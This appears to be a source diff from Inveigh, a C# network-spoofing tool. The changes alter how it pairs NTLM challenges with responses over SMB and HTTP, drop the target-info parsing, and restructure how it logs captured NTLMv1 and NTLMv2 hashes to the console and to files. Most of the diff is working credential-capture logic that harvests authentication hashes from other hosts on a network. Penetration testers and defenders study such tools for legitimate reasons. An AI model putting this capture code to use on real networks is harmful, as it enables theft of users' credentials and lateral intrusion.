@@ -16,55 +16,6 @@ namespace Inveigh
             if (index > 0 && String.Equals(payload.Substring((index + 16), 8), "02000000"))
             {
                 challenge = payload.Substring((index + 48), 16);
-                uint targetNameLength = Util.UInt16DataLength(((index + 24) / 2), field);
-                int negotiateFlags = System.Convert.ToInt16((payload.Substring((index + 44), 2)), 16);
-                string negotiateFlagsValues = Convert.ToString(negotiateFlags, 2);
-                string targetInfoFlag = negotiateFlagsValues.Substring(0, 1);
-                string netBIOSDomainName = "";
-                string dnsComputerName = "";
-                string dnsDomainName = "";
-
-                try
-                {
-
-                    if (targetInfoFlag == "1")
-                    {
-                        int targetInfoIndex = ((index + 80) / 2) + (int)targetNameLength + 16;
-                        byte targetInfoItemType = field[targetInfoIndex];
-                        int i = 0;
-
-                        while (targetInfoItemType != 0 && i < 10)
-                        {
-                            uint targetInfoItemLength = Util.UInt16DataLength((targetInfoIndex + 2), field);
-
-                            switch (targetInfoItemType)
-                            {
-                                case 2:
-                                    netBIOSDomainName = Util.DataToString((targetInfoIndex + 4), (int)targetInfoItemLength, field);
-                                    break;
-
-                                case 3:
-                                    dnsComputerName = Util.DataToString((targetInfoIndex + 4), (int)targetInfoItemLength, field);
-                                    break;
-
-                                case 4:
-                                    dnsDomainName = Util.DataToString((targetInfoIndex + 4), (int)targetInfoItemLength, field);
-                                    break;
-                            }
-
-                            targetInfoIndex += (int)targetInfoItemLength + 4;
-                            targetInfoItemType = field[targetInfoIndex];
-                            i++;
-                        }
-
-                    }
-
-                }
-                catch
-                {
-                    Program.outputList.Add(String.Format("[-] [{0}] NTLM challenge target info parsing failed", DateTime.Now.ToString("s")));
-                }
-
             }
 
             return challenge;
@@ -113,13 +64,42 @@ namespace Inveigh
                 System.Buffer.BlockCopy(field, (ntlmsspOffset + hostOffset), hostPayload, 0, hostPayload.Length);
                 host = Util.DataToString((ntlmsspOffset + hostOffset), hostLength, field);
 
-                if (protocol == "SMB")
+                if (String.Equals(protocol, "SMB"))
                 {
-                    challenge = Program.smbSessionTable[session].ToString();
+
+                    try
+                    {
+                        challenge = Program.smbSessionTable[session].ToString();
+                    }
+                    catch
+                    {
+                        challenge = "";
+                    }
+
                 }
-                else if (protocol == "HTTP")
+                else if (!String.Equals(protocol, "SMB"))
                 {
-                    challenge = Program.httpSessionTable[session].ToString();
+                    try
+                    {
+                        challenge = Program.httpSessionTable[session].ToString();
+                    }
+                    catch
+                    {
+
+                        try
+                        {
+                            //need better better method of tracking challenges when source port changes between challenge and response 
+                            int newSourcePort = Int32.Parse(sourcePort) - 1;
+                            string newSession = sourceIP + ":" + newSourcePort;
+                            challenge = Program.httpSessionTable[newSession].ToString();
+                        }
+                        catch
+                        {
+                            challenge = "";
+                        }
+
+                    }
+
                 }
 
                 if (ntlmLength > 24)
@@ -129,64 +109,71 @@ namespace Inveigh
                     lock (Program.outputList)
                     {
 
-                        if (Program.enabledSMB)
+                        if (String.Equals(protocol, "SMB") && Program.enabledSMB || !String.Equals(protocol, "SMB"))
                         {
 
                             if (Program.enabledMachineAccounts || (!Program.enabledMachineAccounts && !user.EndsWith("$")))
                             {
 
-                                if (String.IsNullOrEmpty(challenge))
+                                if (!String.IsNullOrEmpty(challenge))
+                                {
+
+                                    if (Program.enabledConsoleUnique && Program.ntlmv2UsernameList.Contains(String.Concat(sourceIP, ",", domain, "\\", user)))
+                                    {
+                                        Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv2 captured for {3}\\{4} from {5}({6}):{7}:", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort));
+                                        Program.outputList.Add("[not unique]");
+                                    }
+                                    else
+                                    {
+                                        Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv2 captured for {3}\\{4} from {5}({6}):{7}:", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort));
+                                        Program.outputList.Add(ntlmV2Hash);
+                                    }
+
+                                    if (Program.enabledFileOutput && (!Program.enabledFileUnique || !Program.ntlmv2UsernameList.Contains(String.Concat(sourceIP, ",", domain, "\\", user))))
+                                    {
+
+                                        lock (Program.ntlmv2FileList)
+                                        {
+                                            Program.ntlmv2FileList.Add(ntlmV2Hash);
+                                        }
+
+                                        Program.outputList.Add(String.Format("[!] [{0}] {1}({2}) NTLMv2 written to {3}", DateTime.Now.ToString("s"), protocol, protocolPort, String.Concat(Program.argFilePrefix, "-NTLMv2.txt")));
+                                    }
+
+                                    if (!Program.ntlmv2UsernameList.Contains(String.Concat(sourceIP, ",", domain, "\\", user)))
+                                    {
+
+                                        lock (Program.ntlmv2UsernameList)
+                                        {
+                                            Program.ntlmv2UsernameList.Add(String.Concat(sourceIP, ",", domain, "\\", user));
+                                        }
+
+                                        lock (Program.ntlmv2UsernameFileList)
+                                        {
+                                            Program.ntlmv2UsernameFileList.Add(String.Concat(sourceIP, ",", domain, "\\", user));
+                                        }
+
+                                    }
+
+                                    Program.ntlmv2List.Add(ntlmV2Hash);
+                                }
+                                else
                                 {
                                     Program.outputList.Add(String.Format("[-] [{0}] {1}({2}) NTLMv2 challenge missing for {3}\\{4} from {5}({6}):{7}:", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort));
                                 }
 
-                                if (Program.enabledConsoleUnique && Program.ntlmv2UsernameList.Contains(String.Concat(sourceIP, " ", domain, "\\", user)))
-                                {
-                                    Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv2 captured for {3}\\{4} from {5}({6}):{7}:{8}{9}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort, System.Environment.NewLine, "[not unique]"));
-                                }
-                                else
-                                {
-                                    Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv2 captured for {3}\\{4} from {5}({6}):{7}:", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort));
-                                    Program.outputList.Add(ntlmV2Hash);
-                                }
-
-                                if (Program.enabledFileOutput && (!Program.enabledFileUnique || !Program.ntlmv2UsernameList.Contains(String.Concat(sourceIP, " ", domain, "\\", user))))
-                                {
-
-                                    lock (Program.ntlmv2FileList)
-                                    {
-                                        Program.ntlmv2FileList.Add(ntlmV2Hash);
-                                    }
-
-                                    Program.outputList.Add(String.Format("[!] [{0}] {1}({2}) NTLMv2 written to {3}", DateTime.Now.ToString("s"), protocol, protocolPort, String.Concat(Program.argFilePrefix, "-NTLMv2.txt")));
-                                }
-
-                                if (!Program.ntlmv2UsernameList.Contains(String.Concat(sourceIP, " ", domain, "\\", user)))
-                                {
-
-                                    lock (Program.ntlmv2UsernameList)
-                                    {
-                                        Program.ntlmv2UsernameList.Add(String.Concat(sourceIP, " ", domain, "\\", user));
-                                    }
-
-                                    lock (Program.ntlmv2UsernameFileList)
-                                    {
-                                        Program.ntlmv2UsernameFileList.Add(String.Concat(sourceIP, " ", domain, "\\", user));
-                                    }
-
-                                }
-
-                                Program.ntlmv2List.Add(ntlmV2Hash);
                             }
                             else
                             {
-                                Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv2 ignored for {3}\\{4} from {5}({6}):{7}:{8}{9}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort, System.Environment.NewLine, "[machine account]"));
+                                Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv2 ignored for {3}\\{4} from {5}({6}):{7}:", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort));
+                                Program.outputList.Add("[machine account]");
                             }
 
                         }
                         else
                         {
-                            Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv2 ignored for {3}\\{4} from {5}({6}):{7}:{8}{9}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort, System.Environment.NewLine, "[capture disabled]"));
+                            Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv2 ignored for {3}\\{4} from {5}({6}):{7}:", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort));
+                            Program.outputList.Add("[capture disabled]");
                         }
 
                     }
@@ -205,58 +192,66 @@ namespace Inveigh
                             if (Program.enabledMachineAccounts || (!Program.enabledMachineAccounts && !user.EndsWith("$")))
                             {
 
-                                if (String.IsNullOrEmpty(challenge))
+                                if (!String.IsNullOrEmpty(challenge))
+                                {
+
+                                    if (Program.ntlmv1UsernameList.Contains(String.Concat(sourceIP, " ", domain, "\\", user)))
+                                    {
+                                        Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv1 captured for {3}\\{4} from {5}({6}):{7}:", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort));
+                                        Program.outputList.Add("[not unique]");
+                                    }
+                                    else
+                                    {
+                                        Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv1 captured for {3}\\{4} from {5}({6}):{7}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort));
+                                        Program.outputList.Add(ntlmV1Hash);
+                                    }
+
+                                    if (Program.enabledFileOutput && (!Program.enabledFileUnique || !Program.ntlmv1UsernameList.Contains(String.Concat(sourceIP, ",", domain, "\\", user))))
+                                    {
+
+                                        lock (Program.ntlmv1FileList)
+                                        {
+                                            Program.ntlmv1FileList.Add(ntlmV1Hash);
+                                        }
+
+                                        Program.outputList.Add(String.Format("[!] [{0}] {1}({2}) NTLMv1 written to {3}", DateTime.Now.ToString("s"), protocol, protocolPort, String.Concat(Program.argFilePrefix, "-NTLMv1.txt")));
+                                    }
+
+                                    if (!Program.ntlmv1UsernameList.Contains(String.Concat(sourceIP, ",", domain, "\\", user)))
+                                    {
+
+                                        lock (Program.ntlmv1UsernameList)
+                                        {
+                                            Program.ntlmv1UsernameList.Add(String.Concat(sourceIP, ",", domain, "\\", user));
+                                        }
+
+                                        lock (Program.ntlmv1UsernameFileList)
+                                        {
+                                            Program.ntlmv1UsernameFileList.Add(String.Concat(sourceIP, ",", domain, "\\", user));
+                                        }
+
+                                    }
+
+                                    Program.ntlmv1List.Add(ntlmV1Hash);
+
+                                }
+                                else
                                 {
                                     Program.outputList.Add(String.Format("[-] [{0}] {1}({2}) NTLMv1 challenge missing for {3}\\{4} from {5}({6}):{7}:", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort));
                                 }
 
-                                if (Program.ntlmv1UsernameList.Contains(String.Concat(sourceIP, " ", domain, "\\", user)))
-                                {
-                                    Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv1 captured for {3}\\{4} from {5}({6}):{7}:{8}{9}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort, System.Environment.NewLine, "[not unique]"));
-                                }
-                                else
-                                {
-                                    Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv1 captured for {3}\\{4} from {5}({6}):{7}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort));
-                                    Program.outputList.Add(ntlmV1Hash);
-                                }
-
-                                if (Program.enabledFileOutput && (!Program.enabledFileUnique || !Program.ntlmv1UsernameList.Contains(String.Concat(sourceIP, " ", domain, "\\", user))))
-                                {
-
-                                    lock (Program.ntlmv1FileList)
-                                    {
-                                        Program.ntlmv1FileList.Add(ntlmV1Hash);
-                                    }
-
-                                    Program.outputList.Add(String.Format("[!] [{0}] {1}({2}) NTLMv1 written to {3}", DateTime.Now.ToString("s"), protocol, protocolPort, String.Concat(Program.argFilePrefix, "-NTLMv1.txt")));
-                                }
-
-                                if (!Program.ntlmv1UsernameList.Contains(String.Concat(sourceIP, " ", domain, "\\", user)))
-                                {
-
-                                    lock (Program.ntlmv1UsernameList)
-                                    {
-                                        Program.ntlmv1UsernameList.Add(String.Concat(sourceIP, " ", domain, "\\", user));
-                                    }
-
-                                    lock (Program.ntlmv1UsernameFileList)
-                                    {
-                                        Program.ntlmv1UsernameFileList.Add(String.Concat(sourceIP, " ", domain, "\\", user));
-                                    }
-
-                                }
-
-                                Program.ntlmv1List.Add(ntlmV1Hash);
                             }
                             else
                             {
-                                Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv1 ignored for {3}\\{4} from {5}({6}):{7}:{8}{9}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort, System.Environment.NewLine, "[machine account]"));
+                                Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv1 ignored for {3}\\{4} from {5}({6}):{7}:", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort));
+                                Program.outputList.Add("[machine account]");
                             }
 
                         }
                         else
                         {
-                            Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv1 ignored for {3}\\{4} from {5}({6}):{7}:{7}{8}", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort, System.Environment.NewLine, "[capture disabled]"));
+                            Program.outputList.Add(String.Format("[+] [{0}] {1}({2}) NTLMv1 ignored for {3}\\{4} from {5}({6}):{7}:", DateTime.Now.ToString("s"), protocol, protocolPort, domain, user, sourceIP, host, sourcePort));
+                            Program.outputList.Add("[capture disabled]");
                         }
 
                     }
